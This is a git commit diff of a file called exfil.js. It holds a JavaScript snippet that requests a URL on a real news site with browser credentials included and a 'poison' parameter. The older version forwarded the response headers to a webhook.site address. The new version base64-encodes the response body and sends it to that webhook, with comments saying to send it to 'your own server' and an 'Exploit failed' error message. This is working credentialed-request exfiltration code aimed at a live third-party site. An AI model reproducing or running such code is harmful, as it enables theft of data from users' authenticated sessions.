b07a087bcabc045f07df9fff5c129b95f8dd9f4e
MD_ISHFAQ <69152643+MOHAMMED-ISHFAQ@users.noreply.github.com>
2025-08-07 23:22:56 +0530

    exfil.js

--- exfil.js
+++ exfil.js
@@ -1,13 +1,13 @@
-<script>
 fetch("https://www.bild.de/sitemap-index-200605.xml?poison=1", {
   method: "GET",
   credentials: "include"
 })
-.then(res => {
-  const headers = {};
-  for (let pair of res.headers.entries()) {
-    headers[pair[0]] = pair[1];
-  }
-  return fetch("https://webhook.site/8682f4eb-9534-4d00-8a0d-1abb010810da?headers=" + encodeURIComponent(JSON.stringify(headers)));
-});
-</script>
+  .then(response => response.text()) // Don't use `.json()` if the response is XML or HTML
+  .then(data => {
+    // Base64-encode the response to prevent URL issues
+    const exfil = btoa(data);
+
+    // Send it to your own server or webhook endpoint
+    fetch("https://webhook.site/8682f4eb-9534-4d00-8a0d-1abb010810da?data=" + encodeURIComponent(exfil));
+  })
+  .catch(err => console.error("Exploit failed:", err));
